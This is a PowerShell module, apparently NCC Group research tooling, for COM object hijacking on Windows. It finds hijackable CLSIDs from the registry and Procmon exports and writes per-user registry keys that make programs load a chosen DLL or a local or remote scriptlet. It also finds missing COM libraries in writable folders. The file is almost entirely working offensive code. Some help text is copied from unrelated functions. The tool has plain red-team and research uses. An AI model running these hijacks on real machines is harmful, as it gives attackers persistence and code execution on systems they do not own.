# Copyright (c) 2019, NCC Group. All rights reserved.
# Licensed under BSD 3-Clause License per LICENSE file

function Format-GUID {
    param([String]$guid) 

    if (-not $guid.StartsWith("{")) { 
        $guid = "{" + $guid 
    }
    if (-not $guid.EndsWith("}")) {
        $guid = $guid + "}"
    }
    return $guid
}


function Map-GuidToserver {
<#
.SYNOPSIS
Given a {GUID}, read the DLL it maps to in HKLM registry hive. 
.DESCRIPTION
Prints the path of an in process or out of process COM server, given a GUID
.PARAMETER guid
A GUID, either with or without leading/trailing curly braces
.EXAMPLE
map-guidtoserver -guid {A1A2B1C4-0E3A-11D3-9D8E-00C04F72D980}
map-guidtoserver -guid A1A2B1C4-0E3A-11D3-9D8E-00C04F72D980
#>
    param([String]$guid) 

    # make sure GUID is formated like {0000-....00000}
    $guid = Format-GUID -guid $guid
    $RegistryKey = "HKCR\CLSID\${guid}"
    if (Get-Item -path "Registry::$RegistryKey" 2>$null) {
        $subkeys = Get-ChildItem -path "Registry::$RegistryKey"
        foreach ($subkey in $subkeys) {
            if (${subkey}.Name -like "*inprocserver*" -or ${subkey}.Name -like "*localserver*"){
                $value = (Get-Item -path "Registry::${subkey}").GetValue("")
                return $value
            }
        }
    }
}

function Extract-GUIDFromText {
<#
.SYNOPSIS
Finds a GUID inside a blob of text
.DESCRIPTION
Given some text, extracts the GUID, WITHOUT any leading/traling brackets. Will only match 1st GUID identified
.PARAMETER text
Tect to find a GUID in
.EXAMPLE
Extract-GUIDFromText -text "Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{A1A2B1C4-0E3A-11D3-9D8E-00C04F72D980}"
#>    
    param([String]$text) 
    try {
        $regex = "[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}" 
        $text -match $regex | out-null
        $reg = $matches[0] 2> $null
        return $reg    
    }
    Catch
{

}
}

function Extract-HijackableKeysFromProcmonCSV {
<#
.SYNOPSIS
Given a Procmon CSV export of events, find GUIDs of local or remote objects we can hijack
.DESCRIPTION
Parses a Procmon CSV. The input should only be a save of properly filtered events, refer to the procmon-filters directory
.PARAMETER CSVfile
Path to CSV file
.PARAMETER ProcessName
(Optional) specified a process name to filter on
.EXAMPLE
 Extract-HijackableKeysFromProcmonCSV -CSVfile .\Logfile.CSV -ProcessName explorer
 #>
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory=$true, Position=0)]
        [String]$CSVfile,

        [Parameter(Mandatory=$false, Position=1)]
        [String]$ProcessName
    )
    $array = New-Object System.Collections.ArrayList
    Get-Content $CSVFile | ConvertFrom-Csv | % {$name = $_."Process name"; $path = $_.Path; $guid = Extract-GUIDFromText -text $path; $array.Add("$name,$guid") | out-null}
    $array = $array | sort-object -unique
    Write-Output $array
}

function Get-CLSIDRegistryKeys {
<#
.SYNOPSIS
Enumerates all CLSIDs from registry with inproc/localserver keys
.DESCRIPTION
Returns registry key names of inprocserver/localserver keys
.PARAMETER RegHive
Which have to search. Either HKCU, HKLM, or HKCR
.EXAMPLE
Get-CLSIDRegistryKeys -RegHive "HKLM"
#>
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory=$true, Position=2)]
        [ValidateSet("HKCR","HKLM","HKCU")][String]$RegHive
    )
    if ($RegHive -eq "HKCR") {
        $BaseName = "Registry::HKCR\CLSID"
    } elseif ($RegHive -eq "HKLM") {
        $BaseName = "Registry::HKLM\SOFTWARE\Classes\CLSID"
    } elseif ($RegHive -eq "HKCU") {
        $BaseName = "Registry::HKCU\SOFTWARE\Classes\CLSID"
    }

    $keys = Get-ChildItem -Path $BaseName
    foreach ($key in $keys) {
        $subkeys = $key.GetSubkeyNames()
        foreach ($subkey in $subkeys) {
            #if ($subkey -eq "inprocserver" -or $subkey -eq "localserver") {
                Write-Output "${key}\${subkey}"
            #}
        }
    }
}

# Map a file containing registry keys to DLLs
#  gc .\explorer-keys-duplicates.txt | % {$g = Extract-GUIDFromText -text $_; $dll = map-guidtoserver -guid $g; write-output "${g},${dll}"} >> explorer-guid-dll-matches.txt
function Hijack-CLSID {
<#
.SYNOPSIS
Hijack a COM object
.DESCRIPTION
When defining custom enums, structs, and unmanaged functions, it is
necessary to associate to an assembly module. This helper function
creates an in-memory module that can be passed to the 'enum',
'struct', and Add-Win32Type functions.
.PARAMETER guid
The GUID of the object we want to hijack
.PARAMETER DLL
The FULLY QUALIFIED PATH of the DLL you want loaded
.PARAMETER SCT
A fully qualified path or a URL to a Windows scriptlet file (.sct). Cannot be used with -DLL flag
.PARAMETER ServerType
Either InprocServer, InprocServer32, LocalServer, or LocalServer32. Defaults to Inprocserver32
.EXAMPLE
$Module = New-InMemoryModule -ModuleName Win32
#>
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory=$true)][String]$guid,
        [Parameter()][String]$DLL,
        [Parameter()][String]$SCT,
        [Parameter()][ValidateSet("InProcServer","LocalServer","InProcServer32","LocalServer32")][String]$ServerType = "InprocServer32"
    )

    if (!($DLL -or $SCT)) {
        Write-Host "ERROR: Must specify DLL or SCT"
        return;
    }

    if ($DLL -and $SCT)
    {
        Write-Host "ERROR: Can't specify DLL and SCT at the same time"
        return;
    }

    $guid = Format-GUID -guid $guid
    $hklm_key = "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\${guid}"

    #Write-Output "${guid}"

    if (Test-Path -Path $hklm_key) {
        Write-Output "Found ${guid} in HKLM hive"
    } else {
        Write-Output "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\${guid} does not exist!"
    }


    $hkcu_key = "Registry::HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\${guid}"
    if (Test-Path -Path $hkcu_key) {
        Write-Output "[!] GUID ${guid} already exists in HKCU hive, we can't hijack that`n"
        return
    }
    if ($DLL) {
        Write-Output "Hijacking ${guid} in HKCU with DLL ${dll}"
        New-Item -Path "${hkcu_key}\${ServerType}" -value "$DLL" -ItemType String -Force 1>$null
    }
    elseif ($SCT) {
        Write-Output "Hijacking ${guid} in HKCU with scrobj.dll and ${sct}"
        New-Item -Path "${hkcu_key}\${ServerType}" -value "C:\WINDOWS\system32\scrobj.dll" -ItemType String -Force 1>$null
        New-Item -Path "${hkcu_key}\ScriptletURL" -value "$SCT" -ItemType String -Force 1>$null
    }
    

    if($?) {
        #Write-Output "Registry key ${key} mapped to DLL ID ${guid}"
        # log our output
        Write-Output "${hkcu_key}" | Out-File -append hijack.log
    }
    else {
        Write-Output "ERROR adding ${hkcu_key}"
    }
    Write-Output "`n"
}


function Cleanup-Hijacks {
<#
.SYNOPSIS
Removes all registry keys hijacked using Hijack-CLSID or Hijack-Multiplekeys, as stored in hijack.log in current directoy
.DESCRIPTION
Removes all registry keys hijacked using Hijack-CLSID or Hijack-Multiplekeys, as stored in hijack.log in current directoy
.EXAMPLE
Cleanup-Hijacks
#>
    Write-Output "Deleting the following registry keys"
    get-content hijack.log
    get-content hijack.log | % {remove-item -Recurse $_}
    Remove-Item hijack.log
}

function Hijack-MultipleKeys {
<#
.SYNOPSIS
Given a list of one or more CLSIDs in a file (presumably keys existing in HKLM), registers a unique DLL to the same GUID in HKCU CLSID key.
.DESCRIPTION
This cmdlet will overwrite multiple key values in HKCU to hijack their HKLM counterpart
.PARAMETER file
File containing GUIDs to hijack
.PARAMETER DLL
MUST be fully qualified. Specifies a base DLL. Scriptlet will create a copy in the current directory for each GUID
.PARAMETER ServerType
Optional, either inprocserver32, inprocserver, localserver, or localserver32. Defaults to Inprocserver32
.EXAMPLE
Hijack-MultipleKeys -dll C:\HijackDLL.dll -file GUIDs.txt -ServerType InProcserver32
#>

    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory=$true, Position=0)]
        [String]$file,

        [Parameter(Mandatory=$true, Position=1)]
        [String]$DLL,

        [Parameter(Mandatory=$false, Position=2)]
        [ValidateSet("InprocServer","LocalServer","InprocServer32","LocalServer32")]
        [String]$ServerType = "InprocServer32"

    )

    $RegistryKeys = Get-Content $file

    $TestDLLName=$DLL
    $BaseName = $TestDLLName.split('.')[0] + "_"

    foreach ($key in $RegistryKeys) {
        $key = Format-GUID -guid $key

        # we will use a unique ID per DLL load to tell which CLSID tried to make the load
        # the last section of the GUID will do
        $guid = Extract-GUIDFromText -text $key

        $NewDLL = "${BaseName}${guid}.dll"
        Copy-Item -Path $TestDLLName -destination $NewDLL

        Hijack-CLSID -GUID $guid -DLL $NewDLL -ServerType $ServerType
    }
}

# Helper function - checks if we have write access to a folder where a DLL is stored
# Relies on PowerShellAccessControl Module - see https://gallery.technet.microsoft.com/scriptcenter/PowerShellAccessControl-d3be7b83
function Check-Access {
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory=$true, Position=0)]
        [String]$Path,
        [Alias('User', 'Group', 'IdentityReference')]
        [string[]] $Identity = $env:USERNAME
    )

    import-module .\PowerShellAccessControl\PowerShellAccessControl.psm1

    $effective_access = (Get-EffectiveAccess -Path $Path -Principal $Identity).EffectiveAccess
    $abusable_access_fields = @("CreateFiles", "FullControl", "Modify", "TakeOwnership", "Write", "WriteData")
    foreach ($ace in $effective_access) {
        if ($abusable_access_fields -contains $ace) {
            return $true
        }
    }
}

 
function Find-MissingLibraries {
<#
.SYNOPSIS
Metafunction that searches all CLSIDs in registry, identifies registry entries that point to a COM library that doesnt exist, optionally identifies if we can write a library to that location
.DESCRIPTION
Identify CLSIDs referencing an COM server that doesnt exist on disk. Optionally checks if a user or group has write access to that location
.PARAMETER Principal
User name / group name (defaults to current user)
.PARAMETER CheckAccess
Flag. Checks if the the user has write access to this location (defaults to False)
.EXAMPLE
Hijack-MultipleKeys -dll C:\HijackDLL.dll -file GUIDs.txt -ServerType InProcserver32
#>
    [CmdletBinding()]
    Param
    (
        [Alias('User', 'Group', 'Identity')][string[]] $Principal = $env:USERNAME,
        [switch] $CheckAccess = $false
    )

    $HKCR_keys = Get-CLSIDRegistryKeys -RegHive HKCR
    foreach ($key in $HKCR_keys) {
        $guid = Extract-GUIDFromText -text $key
        $server = map-guidtoserver -guid $guid
        $oldserver = $server
        if ($server) {
            # remove any arguments for out of process servers
            if ($server -like "*.exe*") {
                $position = $server.ToLower().IndexOf(".exe") #index of is case sensitive
                $server = $server.ToLower().Substring(0, $position) + ".exe"
            }
            # TODO: Check if the DLL exists if command is using rundll32.exe
            if (!(test-path -Path "$server".replace('"',''))) {
            # if not found, check if the file exists in the current path
                if (!(Get-Command "$server".replace('"','')) 2>$null) {
                    if ($CheckAccess) {
                        $parentFolder = [System.IO.Path]::GetDirectoryName($server)
                        if (test-path -Path $parentFolder) {
                            if (Check-Access -Identity $Principal -Path $parentFolder) {
                                Write-Output "Write access to ${parentFolder}: ${guid} -> ${server}"
                            }
                        }
                        # Check parent folder also
                        # TODO: recursively walk up path if parent folder doesnt exist either
                        $parentFolder = [System.IO.Path]::GetDirectoryName($parentFolder)
                        if (test-path -Path $parentFolder)
                        {
                            if (Check-Access -Identity $Principal -Path $parentFolder) {
                                Write-Output "Write access to ${parentFolder}: ${guid} -> ${server} "
                            }
                        }
                        
                    } else {
                        Write-Output "Missing library: ${guid} -> ${server}" 
                    }
                    
                }
            }
        }
    }
}